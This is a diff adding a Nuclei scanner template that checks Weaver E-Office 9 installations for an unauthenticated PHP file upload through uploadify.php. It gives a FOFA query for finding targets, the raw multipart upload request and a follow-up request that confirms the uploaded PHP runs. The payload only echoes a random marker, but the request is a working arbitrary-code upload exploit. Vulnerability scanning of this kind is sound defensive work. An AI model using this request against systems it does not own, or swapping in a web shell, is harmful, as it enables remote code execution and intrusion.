@@ -1,0 +1,57 @@
+id: weaver_e_office9_upload
+
+info:
+  name: 泛微E-Office9文件上传
+  author: Xc1Ym
+  severity: critical
+  description: 泛微E-Office9文件上传
+  metadata:
+    max-request: 1
+    fofa-query: app="泛微-EOffice"
+    verified: true
+  tags: upload,OA,weaver,hw,intrusive
+
+variables:
+  payload: '{{rand_base(6)}}'
+  filename: '{{rand_base(6)}}'
+
+http:
+  - raw:
+      - |
+        POST /inc/jquery/uploadify/uploadify.php HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: test
+        Content-Length: 220
+        Accept-Encoding: gzip, deflate, br
+        Connection: close
+        Content-Type: multipart/form-data,boundary=gfgea1saasf5dsgg5fd5fds15gf5kj51vd1s
+
+
+        --gfgea1saasf5dsgg5fd5fds15gf5kj51vd1s
+        Content-Disposition: form-data; name="Filedata"; filename="{{filename}}.php"
+        Content-Type: application/octet-stream
+
+        <?php echo '{{payload}}';?>
+
+        --gfgea1saasf5dsgg5fd5fds15gf5kj51vd1s
+      - |
+        GET /attachment/{{name1}}/{{filename}}.php HTTP/1.1
+        Host: {{Hostname}}
+
+    extractors:
+      - type: regex
+        part: body
+        internal: true
+        name: name1
+        regex:
+        - ^[0-9]*$
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - contains(body_2, '{{payload}}')
+          - status_code_2==200
+          - status_code_1==200
+        condition: and
+# digest: 4a0a004730450220011138f4ab6e80f0f82699331301dc3ed67c3a64b586f5c07c7efe0aaebf83130221008a6ab8946a25302a7962e4d520814d9d9e78ef639fa01077cdc814c7df4d4b48:6b2dd5af372f02ed15a56faf8ad98cf9
